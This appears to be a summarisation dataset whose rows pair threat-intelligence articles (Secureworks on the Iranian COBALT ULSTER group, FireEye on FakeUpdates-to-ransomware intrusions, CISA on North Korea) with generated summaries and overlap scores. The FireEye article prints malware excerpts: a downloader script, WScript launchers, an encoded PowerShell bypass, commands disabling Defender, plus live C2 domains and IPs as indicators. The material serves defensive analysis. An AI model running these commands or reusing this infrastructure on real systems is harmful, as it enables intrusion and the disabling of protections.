improve controls will help network defenders secure their environments against malicious activity regardless of intent.Many Iranian intrusions observed by CTU researchers between 2018 and early 2020 began with the collection of valid credentials in the victim's environment via social engineering, phishing, password spraying, brute-force attacks, and exploitation of publicly available systems. Organizations concerned about threats from Iran should review prevention, detection, and response procedures:Apply security updates to all systems, particularly those that are Internet-facing.Protect user credentials within the environment through periodic user awareness training and multi-factor authentication (MFA). Employ MFA for remote access solutions and web-based email access, including Office365.As most of the observed Iranian intrusions involved malware or abuse of native system tools, employ endpoint detection technology that detects those types of activity.Establish and test procedures for responding to denial of service activity. If appropriate, a distributed denial of service mitigation service provider can ensure continuity of Internet-facing services.To mitigate exposure to this malware, CTU researchers recommend that organizations use available controls to review and restrict access using the indicators listed in Table 1. The domains and URLs may contain malicious content, so consider the risks before opening them in a browser.Indicator Type Context lalindustries.com Domain name Compromised website hosting COBALT ULSTER C2 infrastructure linkupdate.org Domain name Compromised website hosting COBALT ULSTER C2 infrastructure cfm.com.pk Domain name Compromised website hosting COBALT ULSTER C2 infrastructure graphixo.net Domain name Compromised website hosting COBALT ULSTER C2 infrastructure ksahosting.net Domain name Compromised website hosting COBALT ULSTER C2 infrastructure assignmenthelptoday.com Domain name Compromised website hosting COBALT ULSTER C2 infrastructure ampacindustries.com Domain name Compromised website hosting COBALT ULSTER C2 infrastructure http://lalindustries.com/wp-content/upgrade/editor.php?ac=1&n= URL Compromised website hosting COBALT ULSTER C2 infrastructure http://linkupdate.org/js/js.php?ac=1&n= URL Compromised website hosting COBALT ULSTER C2 infrastructure http://cfm.com.pk/wp-includes/utf8.php?ac=1&n= URL Compromised website hosting COBALT ULSTER C2 infrastructure http://advanceorthocenter.com/wp-includes/editor.php?ac=1&n= URL Compromised website hosting COBALT ULSTER C2 infrastructure http://graphixo.net/wp-includes/utf8.php?ac=1&n= URL Compromised website hosting COBALT ULSTER C2 infrastructure http://ksahosting.net/wp-includes/utf8.php URL Compromised website hosting COBALT ULSTER C2 infrastructure https://assignmenthelptoday.com/wp-includes/utf8.php URL Compromised website hosting COBALT ULSTER C2 infrastructure outlook-accounts.tk Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml outlook-accounts.ml Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml officex64.ml Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml windows-patch.tk Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml windows-patch.ml Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml windowscortana.tk Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml msdn-social.tk Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml msdn-social.ml Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml spacex.gq Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml spacex.cf Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml googlecloud.gq Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml googlecloud.cf Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml device-update.tk Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml bing-search.ml Domain name Suspected ForeLord C2 infrastructure linked via bing-search.mlTable 1. Indicators for this threat.";"Cyberespionage operations by governments with mature cyber capabilities persist regardless of geopolitical events. Espionage typically focuses on broader longterm strategic goals.Secureworks(r) Counter Threat Unit(tm) (CTU) researchers monitor Iranian cyber operations, including the potential for retaliation after a January 2, 2020 U.S. drone strike killed Islamic Revolutionary Guard Corps (IRGC) Quds Force General Qasem Soleimani. Although there was ballistic missile bombardment of U.S. military personnel in Iraq on January 8, no governmentdirected cyber retaliation has been observed as of this publication.Despite the lack of retaliatory activity, CTU(tm) researchers have observed the continuation of several espionagefocused campaigns. A series of spearphishing campaigns that occurred between mid2019 and midJanuary 2020 targeted governmental organizations in Turkey, Jordan, Iraq, as well as global intergovernmental organizations and unknown entities in Georgia and Azerbaijan. Most of this activity commenced prior to the U.S. drone strike. Victimology and code similarity between the macros in the analyzed samples and macros documented in opensource reporting suggest that these campaigns were conducted by the COBALT ULSTER threat group (also known as MuddyWater, Seedworm, TEMP.Zagros, and Static Kitten), which is tasked by the Iranian government.Multiple paths to compromiseIn one compromised environment, threat actors conducted multiple rounds of spearphishing with malicious attachments to gain initial access. Some of the email messages contained a link to a This binary typically runs from a location such as C:\Windows\SysWOW64\wscript.exe. The identification of this hash, or command lines that include /E:vbs, running from nonstandard directories could indicate a compromise from this campaign. An HKU\<Security Identifier>\Software\Microsoft\Windows\CurrentVersion\Run\ registry key is set for persistence. Another executed block of VBScript and PowerShell (e.g., the jjcpquui file shown in Figure 2) downloads a secondstage obfuscated PowerShell downloader (see Figure 3). This code downloads additional payloads from an IP address hardcoded in the script (see Figure 4). CTU researchers have observed four different IP addresses. Although many threat groups use multiple layers of obfuscation and multiple stages of activity to deploy payloads, these practices are common in COBALT ULSTER operations. The second infection chain analyzed by CTU researchers also used a spearphishing email to deliver a ZIP archive containing a malicious Excel file. In this case, the Excel file uses an obfuscated macro to drop and execute a previously unobserved remote access trojan (RAT) that CTU researchers refer to as ForeLord. The malicious document uses cmd.exe to execute a batch script (tt.bat) that adds a key to the registry for persistence when the system restarts. In parallel, a PowerShell script uses rundll32.exe to execute the ForeLord malware (Exchange.dll) (see Figure 5). The DNSbased command and control (C2) protocol uses DNS_TYPE_TEXT records to transfer data. The ForeLord name reflects one of the DNS responses that the malware looks for as part of the C2 protocol: ""lord The ForeLord malware uses DNS request formats that correspond to one of the patterns shown in Figure 6. Figure 6. Format of ForeLord DNS requests. (Source: Secureworks)The use of DNS tunneling means the requests are initially directed to legitimate DNS servers, which relay the requests to malicious nameservers controlled by the threat actors. Pivoting on elements of the C2 protocol, CTU researchers identified 14 additional domains possibly registered by COBALT ULSTER. Figure 7. Overview of the interplay of the two infection chains observed in January 2020 campaigns. (Source: Secureworks)After gaining initial access to a host, the threat actors dropped several tools to collect credentials, test those credentials on the network, and create a reverse SSL tunnel to provide an additional access channel to the network. These tools included PASS32.dll, PASS64.dll (see Figure 8), PasswordDumper.exe, and a Mimikatz variant named Caller.dll. The Caller.dll command line included Base64encoded arguments, potentially as an evasion technique to hide the nature of this tool. Figure 8. Example command line used to run PASS64.dll. (Source: Secureworks)CredNinja.ps1 (see Figure 9) is an opensource tool that allows penetration testers to quickly test collected credentials or hashes to determine which will work on a targeted Windows domain. The threat actors used a list of valid user accounts from the target domain in conjunction with a weak password list to determine potentially accessible accounts. The password list could be augmented to test credentials captured from credentialdumping tools. Figure 9. CredNinja ASCII splash screen showing available options. (Source: GitHub)The opensource CTU researchers advise organizations not to conflate ongoing espionage operations with a retaliatory response. However, continually leveraging threat intelligence to assess and improve controls will help network defenders secure their environments against malicious activity regardless of intent.";en;{'r': 0.5499316005471956, 'p': 0.9663461538461539, 'f': 0.7009590189167755};{'r': 0.48712288447387786, 'p': 0.9457142857142857, 'f': 0.6430305928895541};{'r': 0.5499316005471956, 'p': 0.9663461538461539, 'f': 0.7009590189167755}
https://www.mandiant.com/resources/blog/head-fake-tackling-disruptive-ransomware-attacks;Head Fake: Tackling Disruptive Ransomware Attacks;"Within the past several months, FireEye has observed financially-motivated threat actors employ tactics that focus on disrupting business processes by deploying ransomware in mass throughout a victim's environment. Understanding that normal business processes are critical to organizational success, these ransomware campaigns have been accompanied with multi-million dollar ransom amounts. In this post, we'll provide a technical examination of one recent campaign that stems back to a technique that we initially reported on in April 2018.Between May and September 2019, FireEye responded to multiple incidents involving a financially-motivated threat actor who leveraged compromised web infrastructure to establish an initial foothold in victim environments. This activity bared consistencies with a fake browser update campaign first identified in April 2018 - now tracked by FireEye as FakeUpdates. In this newer campaign, the threat actors leveraged victim systems to deploy malware such as Dridex or NetSupport, and multiple post-exploitation frameworks. The threat actors' ultimate goal in some cases was to ransom systems in mass with BitPaymer or DoppelPaymer ransomware (see Figure 1).Figure 1: Recent FakeUpdates infection chainDue to campaign proliferation, we have responded to this activity at both Mandiant Managed Defense customers and incident response investigations performed by Mandiant. Through Managed Defense network and host monitoring as well as Mandiant's incident response findings, we observed the routes the threat actor took, the extent of the breaches, and exposure of their various toolkits.Knock, Knock: FakeUpdates are Back!In April 2018, FireEye identified a campaign that used compromised websites to deliver heavily obfuscated Trojan droppers masquerading as Chrome, Internet Explorer, Opera, and/or Firefox browser updates. The compromised sites contained code injected directly into the HTML or in JavaScript components rendered by the pages which had been injected. These sites were accessed by victim users either via HTTP redirects or watering-hole techniques utilized by the attackers.Since our April 2018 blog post, this campaign has been refined to include new techniques and the use of post-exploitation toolkits. Recent investigations have shown threat actor activity that included internal reconnaissance, credential harvesting, privilege escalation, lateral movement, and ransomware deployment in enterprise networks. FireEye has identified that a large number of the compromised sites serving up the first stage of FakeUpdates have been older, vulnerable Content Management System (CMS) applications.You Are Using an Older Version...of our MalwareThe FakeUpdates campaign begins with a rather intricate sequence of browser validation, performed before the final payload is downloaded. Injected code on the initial compromised page will make the user's browser transparently navigate to a malicious website using hard-coded parameters. After victim browser information is gleaned, additional redirects are performed and the user is prompted to download a fake browser update. FireEye has observed that the browser validation sequence may have additional protections to evade sandbox detections and post-incident triage attempts on the compromise site(s).Figure 2: Example of FakeUpdate landing page after HTTP redirectsThe redirect process used numerous subdomains, with a limited number of IP addresses. The malicious subdomains are often changed in different parts of the initial redirects and browser validation stages.After clicking the 'Update' button, we observed the downloading of one of three types of files:Heavily-obfuscated HTML applications (.hta file extensions)JavaScript files (.js file extensions)ZIP-compressed JavaScript files (.zip extensions)Figure 3 provides a snippet of JavaScript that provides the initial download functionality.var domain = '//gnf6.ruscacademy[.]in/',var statisticsRequest = 'wordpress/news.php?b=612626&m=ad2219689502f09c225b3ca0bfd8e333&y=206',var statTypeParamName = 'st', ... var filename = 'download.hta',var browser = 'Chrome',var special = '1',var filePlain = window.atob(file64),var a = document.getElementById('buttonDownload'),Figure 3: Excerpts of JavaScript code identified from the FakeUpdates landing pagesWhen the user opens the initial FakeUpdates downloader, the Windows Scripting Host (wscript.exe) is executed and the following actions are performed:A script is executed in memory and used to fingerprint the affected system. A subsequent backdoor or banking trojan is downloaded if the system is successfully fingerprinted. A script is executed in memory which: Downloads and launches a third party screenshot utility.Sends the captured screenshots to an attacker. The payload delivered in step 2 is subsequently executed by the script process.The backdoor and banking-trojan payloads described above have been identified as Dridex, NetSupport Manager RAT, AZOrult, and Chthonic malware. The strategy behind the selective payload delivery is unclear, however, the most prevalent malware delivered during this phase of the infection chain were variants of the Dridex backdoor.FakeUpdates: More like FakeHTTPAfter the end user executes the FakeUpdates download, the victim system will send a custom HTTP POST request to a hard-coded Command and Control (C2) server. The POST request, depicted in Figure 4, showed that the threat actors used a custom HTTP request for initial callback. The Age HTTP header, for example, was set to a string of 16 seemingly-random lowercase hexadecimal characters.Figure 4: Initial HTTP communication after successful execution of the FakeUpdates dropperThe HTTP Age header typically represents the time in seconds since an object has been cached by a proxy. In this case, via analysis of the obfuscated code on disk, FireEye identified that the Age header correlates to a scripted ""auth header"" parameter, likely used by the C2 server to validate the request. The first HTTP POST request also contains an XOR-encoded HTTP payload variable ""a="".The C2 server responds to the initial HTTP request with encoded JavaScript. When the code is decoded and subsequently executed, system and user information is collected using wscript.exe. The information collected from the victim system included:The malicious script that initialized the callbackSystem hostnameCurrent user accountActive Directory domainHardware details, such as manufacturerAnti-virus software detailsRunning processesThis activity is nearly identical to the steps observed in our April 2018 post, indicating only minor changes in data collection during this stage. For example, in the earlier iteration of this campaign, we did not observe the collection of the script responsible for the C2 communication. Following the system information gathering, the data is subsequently XOR-encoded and sent via another custom HTTP POST request request to the same C2 server, with the data included in the parameter ""b="". Figure 5 provides a snippet of sample of the second HTTP request.Figure 5: Second HTTP POST request after successful system information gatheringFigure 6 provides a copy of the decoded content, showing the various data points the malware transmitted back to the C2 server.0=5001=C:\Users\User\AppData\Local\Temp\Chrome.js2=AMD643=SYSTEM14=User5=46=Windows_NT7=DOMAIN8=HP9=HP EliteDesk10=BIOS_VERSION11=Windows Defender|Vendor Anti-Virus12=Vendor Anti-Virus|Windows Defender|13=00:00:00:00:00:0014=Enhanced (101- or 102-key)15=USB Input Device16=1024x76817=System Idle Process|System|smss.exe|csrss.exe|wininit.exe|csrss.exe| winlogon.exe|services.exe|lsass.exe|svchost.exe|svchost.exe|svchost.exe|svchost.exe|svchost.exe|svchost.exe|spoolsv.exe|svchost.exe|svchost.exe|HPLaserJetService.exe|conhost.exe...Figure 6: Decoded system information gathered by the FakeUpdates malwareAfter receiving the system information, the C2 server responds with an encoded payload delivered via chunked transfer-encoding to the infected system. This technique evades conventional IDS/IPS appliances, allowing for the second-stage payload to successfully download. During our investigations and FireEye Intelligence's monitoring, we recovered encoded payloads that delivered one of the following:Dridex (Figure 7)NetSupport Manage Remote Access Tools (RATs) (Figure 8)Chthonic or AZORult (Figure 9)function runFile() {var lastException = '',try {var wsh = new ActiveXObject(""WScript.Shell""),wsh.Run('cmd /C rename ""' + _tempFilePathSave + '"" ""' + execFileName + '""'),WScript.Sleep(3 * 1000),runFileResult = wsh.Run('""' + _tempFilePathExec + '""'),lastException = '',} catch (error) {lastException = error.number,runFileExeption += 'error number:' + error.number + ' message:' + error.message,}}Figure 7: Code excerpt observed in FakeUpdates used to launch Dridex payloadsfunction runFile() {var lastException = '',try {var wsh = new ActiveXObject(""WScript.Shell""),runFileResult = wsh.Run('""' + _tempFilePathExec + '"" /verysilent'),lastException = '',} catch (error) {lastException = error.number,runFileExeption += 'error number:' + error.number + ' message:' + error.message,}}Figure 8: Code excerpt observed in FakeUpdates used to launch NetSupport payloadsfunction runFile() {var lastException = '',try {var wsh = new ActiveXObject(""WScript.Shell""),runFileResult = wsh.Run('""' + _tempFilePathExec + '""'),lastException = '',} catch (error) {lastException = error.number,runFileExeption += 'error number:' + error.number + ' message:' + error.message,}}Figure 9: Code excerpt observed in FakeUpdates used to launch Chthonic and AZORult payloadsDuring this process, the victim system downloads and executes nircmdc.exe, a utility specifically used during the infection process to save two system screenshots. Figure 10 provides an example command used to capture the desktop screenshots.""C:\Users\User\AppData\Local\Tempircmdc.exe"" savescreenshot ""C:\Users\User\AppData\Local\Temp\6206a2e3dc14a3d91.png""Figure 10: Sample command used to executed the Nircmd tool to take desktop screenshotsThe PNG screenshots of the infected systems are then transferred to the C2 server, after which they are deleted from the system. Figure 11 provides an example of a HTTP POST request, again with the custom Age and User-Agent headers.Figure 11: Screenshots of the infected system are sent to an attacker-controlled C2Interestingly, the screenshot file transfers were neither encoded nor obfuscated, as with other data elements transferred by the FakeUpdates malware. As soon as the screenshots are transferred, nircmdc.exe is deleted.All Hands on DeckIn certain investigations, the incident was far from over. Following the distribution of Dridex v4 binaries (botnet IDs 199 and 501), new tools and frameworks began to appear. FireEye identified the threat actors leveraged their Dridex backdoor(s) to execute the publicly-available PowerShell Empire and/or Koadic post-exploitation frameworks. Managed Defense also identified the FakeUpdates to Dridex infection chain resulting in the download and execution of PoshC2, another publicly available tool. While it could be coincidental, it is worth noting that the use of PoshC2 was first observed in early September 2019 following the announcement that Empire would no longer be maintained and could represent a shift in attacker TTPs. These additional tools were often executed between 30 minutes and 2 hours after initial Dridex download. The pace of the initial phases of related attacks possibly suggests that automated post-compromise techniques are used in part before interactive operator activity occurs.We identified extensive usage of Empire and C2 communication to various servers during these investigations. For example, via process tracking, we identified a Dridex-injected explorer.exe executing malicious PowerShell: a clear sign of an Empire stager:Figure 12: An example of PowerShell Empire stager execution revealed during forensic analysisIn the above example, the threat actors instructed the victim system to use the remote server 185.122.59[.]78 for command-and-control using an out-of-the-box Empire agent C2 configuration for TLS-encrypted backdoor communications.During their hands-on post-exploitation activity, the threat actors also moved laterally via PowerShell remoting and RDP sessions. FireEye identified the use of WMI to create remote PowerShell processes, subsequently used to execute Empire stagers on domain-joined systems. In one specific case, the time delta between initial Empire backdoor and successful lateral movement was under 15 minutes. Another primary goal for the threat actor was internal reconnaissance of both the local system and domain the computer was joined to. Figure 13 provides a snippet of Active Directory reconnaissance commands issued by the attacker during one of our investigations.Figure 13: Attacker executed commandsThe threat actors used an Empire module named SessionGopher and the venerable Mimikatz to harvest endpoint session and credential information. Finally, we also identified the attackers utilized Empire's Invoke-EventVwrBypass, a Windows bypass technique used to launch executables using eventvwr.exe, as shown in Figure 14.""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoP -NonI -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update), powershell -NoP -NonI -W Hidden -enc $xFigure 14: PowerShell event viewer bypassRansomware Attacks & Operator TacticsWithin these investigations, FireEye identified the deployment BitPaymer or DoppelPaymer ransomware. While these ransomware variants are highly similar, DoppelPaymer uses additional obfuscation techniques. It also has enhanced capabilities, including an updated network discovery mechanism and the requirement of specific command-line execution. DoppelPaymer also uses a different encryption and padding scheme.The ransomware and additional reconnaissance tools were downloaded through public sharing website repositories such as DropMeFiles and SendSpace. Irrespective of the ransomware deployed, the attacker used the SysInternals utlity PSEXEC to distribute and execute the ransomware.Notably, in the DoppelPaymer incident, FireEye identified that Dridex v2 with the Botnet ID 12333 was downloaded onto the same system previously impacted by an instance of Dridex v4 with Botnet ID 501. Within days, this secondary Dridex instance was then used to enable the distribution of DoppelPaymer ransomware. Prior to DoppelPaymer, the threat actor deleted volume shadow copies and disabled anti-virus and anti-malware protections on select systems. Event log artifacts revealed commands executed through PowerShell which were used to achieve this step (Figure 15):Event Log EID Message Microsoft-Windows-PowerShell%4Operational 600 HostApplication=powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true Microsoft-Windows-PowerShell%4Operational 600 HostApplication=powershell.exe Uninstall-WindowsFeature -Name Windows-Defender Application 1034 Windows Installer removed the product. Product Name: McAfee Agent-++-5.06.0011-++-1033-++-1603-++-McAfee, Inc.-++-(NULL)-++--++-. Product Version: 82.Figure 15: Event log entries related to the uninstallation of AV agents and disablement of real-time monitoringThe DoppelPaymer ransomware was found in an Alternate Data Stream (ADS) in randomly named files on disk. ADSs are attributes within NTFS that allow for a file to have multiple data streams, with only the primary being visible in tools such as Windows Explorer. After ransomware execution, files are indicated as encrypted by being renamed with a "".locked"" file extension. In addition to each "".locked"" file, there is a ransom note with the file name ""readme2unlock.txt"" which provides instructions on how to decrypt files.Figure 16: DoppelPaymer ransomware note observed observed during a Mandiant Incident Response investigationRansomware? Not In My House!Over the past few years, we have seen ransomware graduate from a nuisance malware to one being used to extort victim networks out of significant sums of money. Furthermore, threat actors are now coupling ransomware with multiple toolkits or other malware families to gain stronger footholds into an environment. In this blog post alone, we witnessed a threat actor move through multiple toolsets - some automated, some manual - with the ultimate goal of holding the victim organization hostage.Ransomware also raises the stakes for unprepared organizations as it levels the playing field for all areas of your enterprise. Ransomware proves that threat actors don't need to get access to the most sensitive parts of your organization - they need to get access to the ones that will disrupt business processes. This widens your attack surface, but luckily, also gives you more opportunity for detection and response. Mandiant recently published an in depth white paper on Ransomware Protection and Containment Strategies, which may help organizations mitigate the risk of ransomware events.IndicatorsThe following indicator set is a collective representation of artifacts identified during investigations into multiple customer compromises.Type Indicator(s) FakeUpdates Files 0e470395b2de61f6d975c92dea899b4f 7503da20d1f83ec2ef2382ac13e238a8 102ae3b46ddcb3d1d947d4f56c9bf88c aaca5e8e163503ff5fadb764433f8abb 2c444002be9847e38ec0da861f3a702b 62eaef72d9492a8c8d6112f250c7c4f2 175dcf0bd1674478fb7d82887a37317410eefc485a42fac3b928f960a98dc451a2ac7b9c0a049ceecc1f17022f16fdc6 FakeUpdates Domains & IP Addresses <8-Characters>.green.mattingsolutions[.]co<8-Characters>.www2.haciendarealhoa[.]com<8-Characters>.user3.altcoinfan[.]com93.95.100[.]178130.0.233[.]178185.243.115[.]84 gnf6.ruscacademy[.]in backup.awarfaregaming[.]com click.clickanalytics208[.]com track.amishbrand[.]com track.positiverefreshment[.]org link.easycounter210[.]com nircmdc.exe 8136d84d47cb62b4a4fe1f48eb64166e Dridex 7239da273d3a3bfd8d169119670bb745 72fe19810a9089cd1ec3ac5ddda22d3f07b0ce2dd0370392eedb0fc161c99dc7c8bb08283e55aed151417a9ad1bc7ad9 6e05e84c7a993880409d7a0324c10e74 63d4834f453ffd63336f0851a9d4c632 0ef5c94779cd7861b5e872cd5e922311 Empire C2 185.122.59[.]78 109.94.110[.]136Detecting the TechniquesFireEye detects this activity across our platforms, including named detections for Dridex, Empire, BitPaymer and DoppelPaymer Ransomware. As a result of these investigations, FireEye additionally deployed new indicators and signatures to Endpoint and Network Security appliances. This table contains several specific detection names from a larger list of detections that were available prior to this activity occurring.Platform Signature Name Endpoint Security HX Exploit DetectionEmpire RAT (BACKDOOR)EVENTVWR PARENT PROCESS (METHODOLOGY)Dridex (BACKDOOR)Dridex A (BACKDOOR)POWERSHELL SSL VERIFICATION DISABLE (METHODOLOGY)SUSPICIOUS POWERSHELL USAGE (METHODOLOGY)FAKEUPDATES SCREENSHOT CAPTURE (METHODOLOGY) Network Security Backdoor.FAKEUPDATESTrojan.Downloader.FakeUpdateExploit.Kit.FakeUpdateTrojan.SSLCert.SocGholishMITRE ATT&CK Technique MappingATT&CK Techniques Initial Access Drive-by Compromise (T1189), Exploit Public-Facing Application (T1190) Execution PowerShell (T1086), Scripting (T1064), User Execution (T1204), Windows Management Instrumentation (T1047) Persistence DLL Search Order Hijacking (T1038) Privilege Escalation Bypass User Account Control (T1088), DLL Search Order Hijacking (T1038) Defense Evasion Bypass User Account Control (T1088), Disabling Security Tools (T1089), DLL Search Order Hijacking (T1038), File Deletion (T1107), Masquerading (T1036), NTFS File Attributes (T1096), Obfuscated Files or Information (T1027), Scripting (T1064), Virtualization/Sandbox Evasion (T1497) Credential Access Credential Dumping (T1003) Discovery Account Discovery (T1087), Domain Trust Discovery (T1482), File and Directory Discovery (T1083), Network Share Discovery (T1135), Process Discovery (T1057), Remote System Discovery (T1018), Security Software Discovery (T1063), System Information Discovery (T1082), System Network Configuration Discovery (T1016), Virtualization/Sandbox Evasion (T1497) Lateral Movement Remote Desktop Protocol (T1076), Remote File Copy (T1105) Collection Data from Local System (T1005), Screen Capture (T1113) Command And Control Commonly Used Port (T1436), Custom Command and Control Protocol (T1094) ,Data Encoding (T1132), Data Obfuscation (T1001), Remote Access Tools (T1219), Remote File Copy (T1105), Standard Application Layer Protocol (T1071) Exfiltration Automated Exfiltration (T1020), Exfiltration Over Command and Control Channel (T1041) Impact Data Encrypted for Impact (T1486), Inhibit System Recovery (T1490), Service Stop (T1489)AcknowledgementsA huge thanks to James Wyke and Jeremy Kennelly for their analysis of this activity and support of this post.Catch an on-demand recap on this and the Top 5 Managed Defense attacks this year.";"FireEye has observed that the threat actors leveraged victim systems to deploy malware such as Dridex or NetSupport, and multiple postexploitation frameworks. The threat actors' ultimate goal in some cases was to ransom systems in mass with BitPaymer or DoppelPaymer ransomware. FireEye has observed that the browser validation sequence may have additional protections to evade sandbox detections and postincident triage attempts on the compromise site(s).Figure 2: Example of FakeUpdate landing page after HTTP redirectsThe redirect process used numerous subdomains, with a limited number of IP addresses. The malicious subdomains are often changed in different parts of the initial redirects and browser validation stages.After clicking the 'Update' button, we observed the downloading of one of three types of files:Heavilyobfuscated HTML applications (.hta file extensions)JavaScript files (.js file extensions)ZIPcompressed JavaScript files (.zip extensions)Figure 3 provides a snippet of JavaScript that provides the initial download functionality.var domain = '//gnf6.ruscacademy[. ]in/';var statisticsRequest = 'wordpress/news.php?b=612626&m=ad2219689502f09c225b3ca0bfd8e333&y=206';var statTypeParamName = 'st'; ... var filename = 'download.hta';var browser = 'Chrome';var special = '1';var filePlain = window.atob(file64);var a = document.getElementById('buttonDownload');Figure 3: Excerpts of JavaScript code identified from the FakeUpdates landing pagesWhen the user opens the initial FakeUpdates downloader, the Windows Scripting Host (wscript.exe) is executed and the following actions are performed:A script is executed in memory and used to fingerprint the affected system. A subsequent backdoor or banking trojan is downloaded if the system is successfully fingerprinted. A script is executed in memory which: Downloads and launches a third FireEye has observed the threat actors leveraging their Dridex backdoor(s) to execute the publiclyavailable PowerShell Empire and/or Koadic postexploitation frameworks. Managed Defense has also observed the FakeUpdates to Dridex infection chain resulting in the download and execution of PoshC2, another publicly available tool. While it could be coincidental, it is worth noting that the use of PoshC2 was first observed in early September 2019 following the announcement that Empire would no longer be maintained and could represent a shift in attacker TTPs. FireEye has identified the deployment of BitPaymer or DoppelPaymer ransomware. The ransomware and additional reconnaissance tools were downloaded through public sharing website repositories such as DropMeFiles and SendSpace. Irrespective of the ransomware deployed, the attacker used the SysInternals utlity PSEXEC to distribute and execute the ransomware. Notably, in the DoppelPaymer incident, FireEye identified that Dridex v2 with the Botnet ID 12333 was downloaded onto the same system previously impacted by an instance of Dridex v4 with Botnet ID 501. Ransomware has evolved from a nuisance malware to one being used to extort victim networks out of significant sums of money. Furthermore, threat actors are now coupling ransomware with multiple toolkits or other malware families to gain stronger footholds into an environment. In this blog post alone, we witnessed a threat actor move through multiple toolsets some automated, some manual with the ultimate goal of holding the victim organization hostage. Ransomware also raises the stakes for unprepared organizations as it levels the playing field for all areas of your enterprise. Ransomware proves that threat actors don't need to get access to the most sensitive parts of your organization they need to get access to the ones that will disrupt business processes. This widens your attack surface, but luckily, also gives you more opportunity for detection and response. FireEye has detected this activity across our platforms, including named detections for Dridex, Empire, BitPaymer and DoppelPaymer. As a result of these investigations, FireEye additionally deployed new indicators and signatures to Endpoint and Network Security appliances.";en;{'r': 0.25821972734562953, 'p': 0.9526627218934911, 'f': 0.40630914490950465};{'r': 0.2071307300509338, 'p': 0.9087523277467412, 'f': 0.3373660529739246};{'r': 0.25821972734562953, 'p': 0.9526627218934911, 'f': 0.40630914490950465}
https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/north-korea;North Korea Cyber Threat Overview and Advisories;"This page provides an overview of the Cybersecurity and Infrastructure Security Agency's (CISA's) assessment of the North Korean government's malicious cyber activities. The U.S. Government (USG) refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. The overview leverages publicly available, open-source intelligence and information regarding this threat. This page also includes a complete list of related CISA publications, many of which are jointly authored with other U.S. government agencies (Note: unless specifically stated, neither CISA nor the U.S. Government attributed specific activity described in the referenced sources to North Korean government actors). Additionally, this page provides instructions on how to report related threat activity.The North Korean government--officially known as the Democratic People's Republic of Korea (DPRK)--employs malicious cyber activity to collect intelligence, conduct attacks, and generate revenue.[1],[2] Recent advisories published by CISA and other unclassified sources reveal that North Korea is conducting operations worldwide. According to the U.S. Office of the Director of National Intelligence 2021 Annual Threat Assessment, ""North Korea's cyber program poses a growing espionage, theft, and attack threat."" Specifically, the Assessment states, ""North Korea has conducted cyber theft against financial institutions and cryptocurrency exchanges worldwide, potentially stealing hundreds of millions of dollars, probably to fund government priorities, such as its nuclear and missile programs.""[3]Latest U.S. Government Report on North Korean Malicious Cyber ActivityOn February 9, 2023, the NSA, FBI, CISA, Department of Health and Human Services, the Republic of Korea (ROK) National Intelligence Service, and the ROK Defense Security Agency issued a joint Cybersecurity Advisory to highlight ongoing ransomware activity against Healthcare and Public Health Sector organizations and other critical infrastructure sector entities.The North Korean Malicious Cyber Activity section below lists all CISA Advisories, Alerts, and MARs on North Korea's malicious cyber activities.North Korean Malicious Cyber Activity1-888-282-0870 (From outside the United States: +1-703-235-8832)Central@cisa.gov (UNCLASS) CISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and phishing-related scams. Reporting forms can be found on the CISA homepage at https://www.us-cert.cisa.gov/.Mitigate and Detect this ThreatCISA recommends users and administrators review the publications in the North Korean Malicious Cyber Activity section as well as the following resources for descriptions of tactics and techniques associated with this threat and recommended mitigations and detections. Note: unless specifically stated, neither CISA nor the U.S. Government attributed specific activity described in the referenced sources to North Korean government actors. MITRE ATT&CK(r) Groups pageFireEye APT Groups pageRespond to an IncidentCISA recommends users and administrators consult the Joint Advisory, Technical Approaches to Uncovering and Remediating Malicious Activity, which details technical approaches to uncovering malicious activity and includes mitigation steps according to best practices. This Joint Advisory is the result of a collaborative research effort by the cybersecurity authorities of five nations: Australia, Canada, New Zealand, the United Kingdom, and the United States.References";"This page provides an overview of the Cybersecurity and Infrastructure Security Agency's (CISA's) assessment of the North Korean government's malicious cyber activities. The U.S. Government (USG) refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. The overview leverages publicly available, opensource intelligence and information regarding this threat. This page also includes a complete list of related CISA publications, many of which are jointly authored with other U.S. government agencies (Note: unless specifically stated, neither CISA nor the U.S. Government attributed specific activity described in the referenced sources to North Korean government actors). Additionally, this page provides instructions on how to report related threat activity.The North Korean governmentofficially known as the Democratic People's Republic of Korea (DPRK)employs malicious cyber activity to collect intelligence, conduct attacks, and generate revenue.[1],[2] Recent advisories published by CISA and other unclassified sources reveal that North Korea is conducting operations worldwide. According to the U.S. Office of the Director of National Intelligence 2021 Annual Threat Assessment, ""North Korea has conducted cyber theft against financial institutions and cryptocurrency exchanges worldwide, potentially stealing hundreds of millions of dollars, probably to fund government priorities, such as its nuclear and missile programs.""[3]Latest U.S. Government Report on North Korean Malicious Cyber ActivityOn February 9, 2023, the NSA, FBI, CISA, Department of Health and Human Services, the Republic of Korea (ROK) National Intelligence Service, and the ROK Defense Security Agency issued a joint Cybersecurity Advisory to highlight ongoing r";en;{'r': 0.555956678700361, 'p': 0.9746835443037974, 'f': 0.7080459723856785};{'r': 0.5292682926829269, 'p': 0.96875, 'f': 0.6845425821811343};{'r': 0.555956678700361, 'p': 0.9746835443037974, 'f': 0.7080459723856785}
